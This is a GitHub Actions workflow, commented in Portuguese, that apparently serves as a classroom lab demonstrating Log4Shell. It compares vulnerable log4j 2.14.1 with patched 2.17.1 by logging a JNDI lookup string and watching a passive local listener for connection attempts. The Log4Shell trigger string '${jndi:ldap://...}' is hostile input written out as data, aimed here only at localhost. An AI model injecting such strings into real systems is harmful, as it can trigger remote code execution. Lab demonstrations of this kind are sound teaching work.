name: "üß™ Lab Log4Shell ‚Äî ataque controlado (sa√≠da em tela, tudo em 1 YML)"

on:
  workflow_dispatch: {}

permissions:
  contents: read

jobs:
  demo:
    name: "${{ matrix.scenario }} ‚Äî execu√ß√£o e evid√™ncia em tela"
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        include:
          - scenario: vulneravel
            log4j_version: "2.14.1"   # vulner√°vel (JNDI ativo)
          - scenario: corrigido
            log4j_version: "2.17.1"   # corrigido (JNDI desativado)

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup ambiente (Java/Maven + ferramentas de rede)
        run: |
          sudo apt-get update -y
          sudo apt-get install -y maven jq socat
          java -version
          mvn -v
          socat -V || true

      - name: Criar projeto Java (pom.xml + App.java)
        run: |
          mkdir -p src/main/java/com/example
          cat > pom.xml <<'XML'
          <project xmlns="http://maven.apache.org/POM/4.0.0"
                   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                   xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
            <modelVersion>4.0.0</modelVersion>
            <groupId>com.example</groupId>
            <artifactId>log4j-lab</artifactId>
            <version>1.0.0</version>
            <properties>
              <maven.compiler.source>11</maven.compiler.source>
              <maven.compiler.target>11</maven.compiler.target>
              <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
            </properties>
            <dependencies>
              <dependency>
                <groupId>org.apache.logging.log4j</groupId>
                <artifactId>log4j-api</artifactId>
                <version>${log4j.version}</version>
              </dependency>
              <dependency>
                <groupId>org.apache.logging.log4j</groupId>
                <artifactId>log4j-core</artifactId>
                <version>${log4j.version}</version>
              </dependency>
            </dependencies>
            <build>
              <plugins>
                <plugin>
                  <groupId>org.codehaus.mojo</groupId>
                  <artifactId>exec-maven-plugin</artifactId>
                  <version>3.1.0</version>
                  <configuration>
                    <mainClass>com.example.App</mainClass>
                  </configuration>
                </plugin>
              </plugins>
            </build>
          </project>
          XML

          cat > src/main/java/com/example/App.java <<'JAVA'
          package com.example;
          import org.apache.logging.log4j.LogManager;
          import org.apache.logging.log4j.Logger;

          public class App {
              private static final Logger logger = LogManager.getLogger(App.class);

              public static void main(String[] args) {
                  // Input da "requisi√ß√£o" simulada (N√ÉO executa payload; apenas aciona resolu√ß√£o)
                  String entrada = System.getenv().getOrDefault("LOG_INPUT",
                          "${jndi:ldap://127.0.0.1:1389/a}");

                  logger.info("Iniciando app Log4j (demo segura).");
                  // O ponto did√°tico: ao logar esse texto, vers√µes vulner√°veis tentam resolver JNDI
                  logger.error("Processando campo: {}", entrada);

                  System.out.println("APP_DONE");
              }
          }
          JAVA

      - name: Montar projeto com vers√£o ${{ matrix.log4j_version }}
        run: |
          mvn -q -DskipTests -Dlog4j.version=${{ matrix.log4j_version }} package
          echo "==> Vers√£o efetiva do log4j-core: ${{ matrix.log4j_version }}"

      - name: (Opcional) Confirmar presen√ßa do vetor JndiLookup.class
        run: |
          # Baixa o JAR exato para inspe√ß√£o e verifica se JndiLookup.class existe
          mvn -q dependency:get -Dartifact=org.apache.logging.log4j:log4j-core:${{ matrix.log4j_version }}:jar
          JAR_PATH=$(ls -1 $HOME/.m2/repository/org/apache/logging/log4j/log4j-core/${{ matrix.log4j_version }}/log4j-core-${{ matrix.log4j_version }}.jar)
          echo "JAR: $JAR_PATH"
          (unzip -l "$JAR_PATH" | grep -q 'JndiLookup.class' && echo ">> JndiLookup PRESENTE (vetor existe)") || echo ">> JndiLookup AUSENTE (vetor removido/desativado)"

      - name: Subir listener local (porta 1389) para evidenciar conex√£o
        run: |
          # Listener "burro": s√≥ registra bytes recebidos e imprime em tempo real.
          # N√ÉO responde com payload, n√£o executa nada.
          (socat -v -d -d TCP-LISTEN:1389,reuseaddr,fork - 2>&1 | tee ldap-listener.log) &
          echo $! > listener.pid
          sleep 1
          ss -ltnp | grep :1389 || true

      - name: Executar app com input JNDI (cen√°rio ${{ matrix.scenario }})
        env:
          LOG_INPUT: "${jndi:ldap://127.0.0.1:1389/a}"
        run: |
          echo "===== EXECUTANDO APP (${ { matrix.scenario } }) ====="
          # Mostra a linha do log que cont√©m o input
          mvn -q -Dexec.classpathScope=runtime -Dlog4j.version=${{ matrix.log4j_version }} \
            org.codehaus.mojo:exec-maven-plugin:3.1.0:java | tee app-run-${{ matrix.scenario }}.log
          echo "===== FIM DA EXECU√á√ÉO ====="
          # Aguarda at√© 3s por poss√≠veis conex√µes do Log4j ao listener
          sleep 3
          kill -0 $(cat listener.pid) 2>/dev/null && echo "Listener ainda ativo." || echo "Listener j√° encerrou."

      - name: Encerrar listener e imprimir capturas
        if: always()
        run: |
          if [ -f listener.pid ]; then
            kill $(cat listener.pid) 2>/dev/null || true
          fi
          echo ""
          echo "===== CAPTURA DO LISTENER (porta 1389) ‚Äî ${{ matrix.scenario }} ====="
          if [ -s ldap-listener.log ]; then
            # Mostra apenas algumas linhas significativas
            grep -E "TCP|LEN|CONNECT|length|bytes" -n ldap-listener.log || head -n 50 ldap-listener.log || true
            echo ">> RESULTADO: Conex√£o JNDI FOI TENTADA (lookup disparado)."
          else
            echo "(vazio)"
            echo ">> RESULTADO: Nenhuma conex√£o ao listener ‚Äî sem lookup (vers√£o corrigida / JNDI desativado)."
          fi
          echo ""
          echo "===== TRECHO DO LOG DA APLICA√á√ÉO ‚Äî ${{ matrix.scenario }} ====="
          (grep -E "\\$\\{jndi" -n app-run-${{ matrix.scenario }}.log || head -n 20 app-run-${{ matrix.scenario }}.log) 2>/dev/null || true

      - name: Artefatos (opcional, para baixar ap√≥s a aula)
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: "outputs-${{ matrix.scenario }}"
          path: |
            app-run-${{ matrix.scenario }}.log
            ldap-listener.log
